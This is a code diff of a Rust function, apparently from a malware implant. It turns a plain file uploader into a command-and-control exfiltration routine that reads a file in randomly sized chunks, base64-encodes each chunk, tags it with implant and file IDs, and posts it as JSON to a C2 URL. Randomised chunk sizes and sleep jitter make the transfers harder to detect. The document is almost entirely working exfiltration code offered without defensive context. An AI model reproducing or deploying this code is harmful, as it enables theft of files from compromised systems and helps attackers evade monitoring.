@@ -1,16 +1,24 @@
+use base64::{engine::general_purpose::STANDARD, Engine as _};
 use rand::Rng;
 use reqwest::Client;
-use std::{fs::File, io::Read, path::Path, thread, time::Duration};
+use std::{fs::File, io::Read, path::Path, time::Duration};
+use uuid::Uuid;
 
 const MIN_CHUNK_SIZE: usize = 256 * 1024; // 256 KB
 const MAX_CHUNK_SIZE: usize = 1024 * 1024; // 1 MB
 
-pub async fn send_file(file_path: &Path, url: &str) -> Result<(), Box<dyn std::error::Error>> {
+pub async fn send_file(
+    implant_id: Uuid,
+    file_path: &Path,
+    c2_url: &str,
+) -> Result<(), Box<dyn std::error::Error>> {
     let client = Client::new();
     let mut file = File::open(file_path)?;
-    let mut chunk_number = 0;
+    let mut chunk_index = 0;
 
     let mut rng = rand::thread_rng();
+
+    let file_id = Uuid::new_v4().to_string();
 
     loop {
         // Generate a random chunk size within the specified range
@@ -19,25 +27,48 @@ pub async fn send_file(file_path: &Path, url: &str) -> Result<(), Box<dyn std::e
 
         match file.read(&mut buffer) {
             Ok(bytes_read) if bytes_read > 0 => {
-                let response = client
-                    .post(url)
-                    .header("Chunk-Number", chunk_number.to_string())
-                    .body(buffer[..bytes_read].to_vec())
-                    .send()
-                    .await?;
+                let chunk_data = &buffer[..bytes_read];
 
-                if !response.status().is_success() {
-                    eprintln!("Failed to send chunk {}", chunk_number);
+                // Encode with base64 for the transfer
+                let encoded_chunk = STANDARD.encode(chunk_data);
+
+                let response = client
+                    .post(c2_url)
+                    .json(&serde_json::json!({
+                        "uuid": implant_id,
+                        "file_id": &file_id,
+                        "chunk_index": chunk_index,
+                        "chunk_data": &encoded_chunk,
+                    }))
+                    .send()
+                    .await;
+
+                match response {
+                    Ok(response) => {
+                        if !response.status().is_success() {
+                            eprintln!(
+                                "Failed to send chunk {}, status: {}",
+                                chunk_index,
+                                response.status()
+                            );
+                        }
+                    }
+                    Err(e) => {
+                        eprintln!("Error sending chunk {}: {}", chunk_index, e);
+                    }
                 }
 
-                chunk_number += 1;
-
-                let seconds_to_sleep = rand::thread_rng().gen_range(2..11);
-                thread::sleep(Duration::from_secs(seconds_to_sleep));
+                chunk_index += 1;
             }
-            Ok(_) => break, // End of file
+            Ok(_) => {
+                println!("Successfully sent all chunks! File id: {}", file_id);
+                break;
+            }
+            // End of file
             Err(e) => return Err(Box::new(e)),
         }
+        let millis_to_sleep = rand::thread_rng().gen_range(505..1250);
+        std::thread::sleep(Duration::from_millis(millis_to_sleep));
     }
     Ok(())
 }
